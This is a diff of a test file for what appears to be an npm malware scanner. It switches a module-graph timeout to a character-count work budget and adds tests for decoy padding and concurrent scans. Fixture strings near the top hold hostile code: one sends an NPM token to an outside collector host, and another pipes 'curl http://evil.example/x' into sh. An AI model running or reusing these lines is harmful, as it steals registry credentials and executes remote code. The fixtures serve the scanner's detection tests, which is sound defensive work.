@@ -6,7 +6,7 @@
  * Every bound an attacker can fill to hide a verdict must either keep the
  * detection or mark the analysis INCONCLUSIVE - never a silent, complete,
  * lower verdict. Reproducers ported from the 2026-09-29 targeted audit
- * (edge padding, flow-quota decoys, module-graph timeout, function BFS bound).
+ * (edge padding, flow-quota decoys, module-graph work budget, function BFS bound).
  * Each malicious case failed on master before this change (score 28 -> 10 with
  * a COMPLETE-looking result, or the payload downgraded as unreachable).
  */
@@ -22,6 +22,9 @@ const { formatOutput } = require('../../src/output/formatter');
 const { _internals } = require('../../src/scanner/reachability');
 
 const COLLECTOR = "fetch('https://collector-unrelated.net/collect',{method:'POST',body:token});";
+const PAYLOAD_FOR_EXCLUDE = "const s = process.env.NPM_TOKEN;\n" +
+  "require('https').request({ hostname: 'collector-unrelated.net', method: 'POST' }).end(s);\n" +
+  "require('child_process').exec('curl http://evil.example/x | sh');\n";
 
 function makePkg(files, pkg = {}) {
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-incomplete-'));
@@ -227,17 +230,17 @@ async function runIncompletenessTests() {
     } finally { cleanup(dir); }
   });
 
-  // --- module-graph timeout: frozen, filtered, INCONCLUSIVE --------------------
+  // --- module-graph work budget: frozen, filtered, INCONCLUSIVE ----------------
 
-  await asyncTest('INCOMPLETE: module-graph timeout is deterministic and INCONCLUSIVE', async () => {
-    await withEnv('MUADDIB_MODULE_GRAPH_TIMEOUT_MS', '0', async () => {
+  await asyncTest('INCOMPLETE: module-graph budget exhaustion is deterministic and INCONCLUSIVE', async () => {
+    await withEnv('MUADDIB_MODULE_GRAPH_WORK_BUDGET', '0', async () => {
       const seen = new Set();
       for (let i = 0; i < 5; i++) {
         const dir = makePkg(edgeFixture(5, true));
         try {
           const r = await runScanDirect(dir);
           assert(r.analysis.status === 'INCONCLUSIVE', 'timeout must make the analysis INCONCLUSIVE');
-          assert(reasons(r).includes('moduleGraph/timeout'), 'timeout reason expected: ' + JSON.stringify(r.analysis));
+          assert(reasons(r).includes('moduleGraph/work-budget'), 'timeout reason expected: ' + JSON.stringify(r.analysis));
           seen.add(r.summary.riskScore + ':' + r.threats.map(t => t.type).sort().join(','));
         } finally { cleanup(dir); }
       }
@@ -245,8 +248,8 @@ async function runIncompletenessTests() {
     });
   });
 
-  await asyncTest('INCOMPLETE: timeout never publishes an unfiltered first-party flow (no 10 -> 28)', async () => {
-    await withEnv('MUADDIB_MODULE_GRAPH_TIMEOUT_MS', '0', async () => {
+  await asyncTest('INCOMPLETE: budget exhaustion never publishes an unfiltered first-party flow (no 10 -> 28)', async () => {
+    await withEnv('MUADDIB_MODULE_GRAPH_WORK_BUDGET', '0', async () => {
       const dir = makePkg(flowQuotaFixture(3, false));
       try {
         const r = await runScanDirect(dir);
@@ -256,16 +259,50 @@ async function runIncompletenessTests() {
     });
   });
 
-  await asyncTest('INCOMPLETE: empty or malformed MUADDIB_MODULE_GRAPH_TIMEOUT_MS keeps the 5 s default', async () => {
+  await asyncTest('INCOMPLETE: empty or malformed MUADDIB_MODULE_GRAPH_WORK_BUDGET keeps the default budget', async () => {
     for (const value of ['', ' ', 'abc', '-1', '1e3', '5s']) {
       const dir = makePkg(edgeFixture(5, true));
       try {
-        const r = await withEnv('MUADDIB_MODULE_GRAPH_TIMEOUT_MS', value, () => runScanDirect(dir));
-        assert(!reasons(r).includes('moduleGraph/timeout'),
-          `value ${JSON.stringify(value)} must not become a 0 ms budget: ` + JSON.stringify(r.analysis));
+        const r = await withEnv('MUADDIB_MODULE_GRAPH_WORK_BUDGET', value, () => runScanDirect(dir));
+        assert(!reasons(r).includes('moduleGraph/work-budget'),
+          `value ${JSON.stringify(value)} must not become a 0 budget: ` + JSON.stringify(r.analysis));
         assert(hasType(r, 'cross_file_dataflow'), `value ${JSON.stringify(value)}: cross-file analysis must still run`);
       } finally { cleanup(dir); }
     }
+  });
+
+  // The budget is a count of source characters, not a clock: a budget spent in the middle of
+  // a step gives the same stopping point, so the same record, on every run and every machine.
+  await asyncTest('INCOMPLETE: module-graph budget is a character count: same stopping point on every run', async () => {
+    const graphRecord = r => (r.analysis.incomplete || []).find(e => e.component === 'moduleGraph' && e.reason === 'work-budget');
+    const dir = makePkg(edgeFixture(30, true));
+    try {
+      const full = await withEnv('MUADDIB_MODULE_GRAPH_WORK_BUDGET', '100000000', () => runScanDirect(dir));
+      assert(!graphRecord(full), 'a budget above the package must complete: ' + JSON.stringify(full.analysis));
+      assert(hasType(full, 'cross_file_dataflow'), 'the flow must be found within the budget');
+      const seen = new Set();
+      for (let i = 0; i < 5; i++) {
+        const r = await withEnv('MUADDIB_MODULE_GRAPH_WORK_BUDGET', '1500', () => runScanDirect(dir));
+        const rec = graphRecord(r);
+        assert(rec && rec.limit === 1500, 'a 1 500-character budget must be spent on this package: ' + JSON.stringify(r.analysis));
+        assert(rec.observed >= 1500, `observed ${rec.observed} must reach the limit`);
+        seen.add(rec.observed + '|' + r.summary.riskScore + '|' + r.threats.map(t => t.type).sort().join(','));
+      }
+      assert(seen.size === 1, 'stopping point must not vary between runs: ' + [...seen].join(' || '));
+    } finally { cleanup(dir); }
+  });
+
+  // Attack: pad the package with large decoy files, read before the payload, so the graph
+  // budget is spent before the source/sink pair. The flow may be lost, but never silently.
+  await asyncTest('INCOMPLETE: decoy padding that spends the graph budget is INCONCLUSIVE, never a silent COMPLETE', async () => {
+    const files = edgeFixture(0, true);
+    files['a-decoy.js'] = 'module.exports = ' + JSON.stringify('x'.repeat(200000)) + ';';
+    const dir = makePkg(files);
+    try {
+      const r = await withEnv('MUADDIB_MODULE_GRAPH_WORK_BUDGET', '100000', () => runScanDirect(dir));
+      assert(r.analysis.status === 'INCONCLUSIVE', 'padding past the budget must make the scan INCONCLUSIVE');
+      assert(reasons(r).includes('moduleGraph/work-budget'), 'work-budget reason expected: ' + JSON.stringify(r.analysis));
+    } finally { cleanup(dir); }
   });
 
   await asyncTest('INCOMPLETE: concurrent scans in one process keep separate records (muaddib watch)', async () => {
@@ -285,6 +322,42 @@ async function runIncompletenessTests() {
           `${order}: unbounded scan inherited another scan's record: ` + JSON.stringify(rb.analysis));
       } finally { cleanup(a); cleanup(b); }
     }
+  });
+
+  // The end of one scan reset module state the other scan was still using (exclusions,
+  // config overrides, size cap, file-list and AST caches): `muaddib watch` re-scans on a
+  // change while a scan runs, and the daemon scans several directories in one process.
+  await asyncTest('INCOMPLETE: a scan that ends does not reset the state of a scan still running', async () => {
+    const a = makePkg({ 'index.js': 'module.exports = 1;\n', 'vendor/payload.js': PAYLOAD_FOR_EXCLUDE });
+    const vendorHits = r => r.threats.filter(t => /vendor/.test(t.file || '')).length;
+    try {
+      const alone = await runScanDirect(a, { exclude: ['vendor'] });
+      assert(vendorHits(alone) === 0, 'fixture: the excluded directory must stay out when run alone');
+      const full = await runScanDirect(a);
+      assert(vendorHits(full) > 0, 'fixture: the directory must produce findings when not excluded');
+      // Another scan (here one that fails at once) ends while the first is at each of its
+      // early steps: before the fix, its reset dropped the first scan's exclusion.
+      for (const ticks of [0, 1, 2, 3, 5]) {
+        const pending = runScanDirect(a, { exclude: ['vendor'] });
+        for (let i = 0; i < ticks; i++) await new Promise(resolve => setImmediate(resolve));
+        await runScanDirect(path.join(a, 'missing-dir')).catch(() => {});
+        const r = await pending;
+        assert(vendorHits(r) === 0, `another scan ended after ${ticks} ticks and this scan lost its exclusion: ` +
+          JSON.stringify(r.threats.map(t => t.file)));
+        assert(r.summary.riskScore === alone.summary.riskScore, `score ${r.summary.riskScore}, alone ${alone.summary.riskScore}`);
+      }
+    } finally { cleanup(a); }
+  });
+
+  await asyncTest('INCOMPLETE: a failed scan does not block the next one in the same process', async () => {
+    const a = makePkg({ 'index.js': 'module.exports = 1;\n' });
+    try {
+      let failed = false;
+      await runScanDirect(path.join(a, 'missing-dir')).catch(() => { failed = true; });
+      assert(failed, 'a scan of a missing path must reject');
+      const r = await runScanDirect(a);
+      assert(r && r.summary, 'the next scan must still run');
+    } finally { cleanup(a); }
   });
 
   // --- function BFS bound: abstain instead of "dead code" ----------------------
@@ -373,7 +446,7 @@ async function runIncompletenessTests() {
   test('INCOMPLETE: --fail-on-inconclusive makes an INCONCLUSIVE scan exit non-zero (fail closed)', () => {
     const dir = makePkg({ 'index.js': 'module.exports = 1;' });
     try {
-      const timeout = { MUADDIB_MODULE_GRAPH_TIMEOUT_MS: '0' };
+      const timeout = { MUADDIB_MODULE_GRAPH_WORK_BUDGET: '0' };
       assert(cliExit(dir, [], timeout) === 0, 'default exit code must stay unchanged (0) for an INCONCLUSIVE clean scan');
       assert(cliExit(dir, ['--fail-on-inconclusive'], timeout) === 1, 'opt-in must fail closed (exit 1)');
       assert(cliExit(dir, ['--fail-on-inconclusive', '--fail-on', 'none'], timeout) === 1,
@@ -386,10 +459,10 @@ async function runIncompletenessTests() {
     const { generateHTML } = require('../../src/output/report');
     const dir = makePkg({ 'index.js': 'module.exports = 1;' });
     try {
-      const inc = await withEnv('MUADDIB_MODULE_GRAPH_TIMEOUT_MS', '0', () => runScanDirect(dir));
+      const inc = await withEnv('MUADDIB_MODULE_GRAPH_WORK_BUDGET', '0', () => runScanDirect(dir));
       const html = generateHTML(inc);
       assert(html.includes('Analysis INCONCLUSIVE'), 'banner expected');
-      assert(html.includes('moduleGraph: timeout'), 'reason expected');
+      assert(html.includes('moduleGraph: work-budget'), 'reason expected');
       assert(!html.includes('<div class="ok">No threats detected</div>'), 'clean panel must not be shown');
       const ok = generateHTML(await runScanDirect(dir));
       assert(ok.includes('<div class="ok">No threats detected</div>'), 'COMPLETE clean scan keeps the clean panel');
